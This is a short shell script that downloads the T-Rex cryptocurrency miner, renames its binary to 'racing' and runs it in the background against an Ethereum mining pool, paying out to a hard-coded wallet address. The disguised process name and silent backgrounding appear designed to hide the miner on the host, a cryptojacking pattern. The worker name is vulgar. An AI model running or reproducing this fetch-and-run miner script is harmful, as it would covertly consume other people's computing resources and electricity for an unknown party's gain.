wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x85c6aa49d2723b03ff8d81177669500ec7cdde5a -p x -w fuckboy &
